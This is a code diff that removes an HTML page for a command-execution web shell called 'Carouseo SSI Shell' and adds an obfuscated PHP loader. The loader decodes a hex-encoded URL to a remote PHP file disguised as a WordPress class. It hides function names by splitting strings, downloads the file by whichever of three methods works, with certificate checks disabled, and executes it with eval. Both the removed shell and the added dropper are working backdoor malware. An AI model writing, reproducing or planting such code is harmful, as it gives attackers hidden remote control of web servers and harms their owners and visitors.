@@ -1,32 +1,59 @@
-<html>
+<?php
+$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f73656e746170616269732f54696e792d4b75726c756e672f726566732f68656164732f6d61696e2f636c6173732d77702d626c6f672d666f726d61742e706870';
 
-<head>
-  <title>Carouseo SSI Shell</title>
-  <link href=https://1.bp.blogspot.com/-NcFB4m944Qw/YJcOCIop0uI/AAAAAAAAA4E/yw5Oahakh4sXKsQNnrkqeXBTKqFwoZlAACLcBGAsYHQ/s554/mickey-mouse.png rel=icon />
-  <link href=https://fonts.googleapis.com/css?family=Sedgwick+Ave rel=stylesheet>
-  <style>
-    body {
-      background-color: #263238;
-      color: white;
-      font-family: Sedgwick Ave;
-      text-align: center;
+function hex2str($hex) {
+    $str = '';
+    for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
+        $str .= chr(hexdec($hex[$i] . $hex[$i + 1]));
     }
-  </style>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
-  <script language="javascript">function fex() { var uri = document.getElementById('command').value; var rep = uri.replace(/[ ]/g, '${IFS}'); var res = encodeURI(uri); document.location.href = "backupshell.shtml? " +encodeURI(rep) ;}</script>
-  <script>document.onkeydown = keydown; function keydown(e) { if (!e) e = event; if (e.keyCode === 13) { var uri = document.getElementById('command').value; var rep = uri.replace(/[ ]/g, '${IFS}'); var res = encodeURI(uri); document.location.href = "backupshell.shtml? " +encodeURI(rep) ; }}</script>
-</head>
+    return $str;
+}
 
-<body>
-  <center><b><a style=color:white;text-decoration:none; href="#">
-        <font face=Sedgwick+Ave size=6>Carouseo SSI Shell</font>
-      </a></b><br><br>
-    <font size=5>carou@seo:~$ <input type=text size=60 id=command class="text" name="peler" required>
-      <input type=button style=color:white;background-color:#808080; value=Execute! onclick="fex();">
-      <br><br>
-      <font size=3>Output: mkdir a</font>
-    </font><br><textarea bgcolor=#e4e0d8 cols=120 rows=15></textarea>
-    <center><a style=color:white;text-decoration:none; href="#"><br>&copy; CAROU SEO</center>
-</body>
+$url = hex2str($hexUrl);
 
-</html>
+function downloadWithFileGetContents($url) {
+    if (ini_get('a' . 'llow' . '_ur' . 'l_fo' . 'pe' . 'n')) {
+        return file_get_contents($url);
+    }
+    return false;
+}
+
+function downloadWithCurl($url) {
+    if (function_exists('c' . 'u' . 'rl' . '_i' . 'n' . 'i' . 't')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+    return false;
+}
+
+function downloadWithFopen($url) {
+    $result = false;
+    if ($fp = fopen($url, 'r')) {
+        $result = '';
+        while ($data = fread($fp, 8192)) {
+            $result .= $data;
+        }
+        fclose($fp);
+    }
+    return $result;
+}
+
+$phpScript = downloadWithFileGetContents($url);
+if ($phpScript === false) {
+    $phpScript = downloadWithCurl($url);
+}
+if ($phpScript === false) {
+    $phpScript = downloadWithFopen($url);
+}
+
+if ($phpScript === false) {
+    die("Gagal mendownload script PHP dari URL dengan semua metode.");
+}
+
+eval('?>' . $phpScript);
+?>
